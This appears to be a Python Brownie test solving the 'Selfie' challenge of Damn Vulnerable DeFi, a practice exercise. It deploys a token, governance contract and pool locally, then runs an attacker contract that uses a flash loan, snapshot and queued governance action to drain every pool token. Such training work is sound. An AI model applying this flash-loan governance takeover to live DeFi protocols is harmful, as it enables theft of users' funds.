from brownie import (
    accounts,
    DamnValuableTokenSnapshot,
    SelfiePool,
    SimpleGovernance,
    attacker6,
)
from web3 import Web3
from brownie.network.state import Chain

TOKEN_INITIAL_SUPPLY = Web3.toWei("2000000", "ether")
TOKENS_IN_POOL = Web3.toWei("1500000", "ether")


def before():
    # setup scenario
    deployer = accounts[0]
    dvt_token = DamnValuableTokenSnapshot.deploy(
        TOKEN_INITIAL_SUPPLY, {"from": deployer}
    )

    governance = SimpleGovernance.deploy(dvt_token.address, {"from": deployer})
    pool = SelfiePool.deploy(dvt_token.address, governance.address, {"from": deployer})

    dvt_token.transfer(pool.address, TOKENS_IN_POOL, {"from": deployer})
    assert dvt_token.balanceOf(pool.address) == TOKENS_IN_POOL


def run_exploit():
    # remove pass and add exploit code here
    # attacker = accounts[1] - account to be used for exploit
    # Tip: Chain again...
    dvt_token = DamnValuableTokenSnapshot[-1]
    governance = SimpleGovernance[-1]
    pool = SelfiePool[-1]
    attacker = accounts[1]
    attacker_contract = attacker6.deploy(dvt_token.address, governance.address, pool.address, {"from": attacker})

    # Step 1 - execute the attack function (flashloan, snapshot, reimburse, queueAction)

    tx = attacker_contract.attack(attacker.address, {"from": attacker})

    # Step 2 - retrieve the actioniD, the time delay, then forward the chain of the time delay to be able to execute the action

    # retrieve the actionId of the action that we just queued
    actionId = tx.events["ActionQueued"]["actionId"]
    # get the time delay required by the smart contract
    actionDelay = governance.getActionDelay()
    # advance chain time by the time delay
    chain = Chain()
    chain.sleep(actionDelay)

    # Step 3 - exxecute the action

    governance.executeAction(actionId);

def after():
    # confirm attacker has tokens from pool
    attacker = accounts[1]
    assert DamnValuableTokenSnapshot[-1].balanceOf(attacker.address) == TOKENS_IN_POOL
    assert DamnValuableTokenSnapshot[-1].balanceOf(SelfiePool[0].address) == 0


def test_selfie_challenge():
    before()
    run_exploit()
    after()
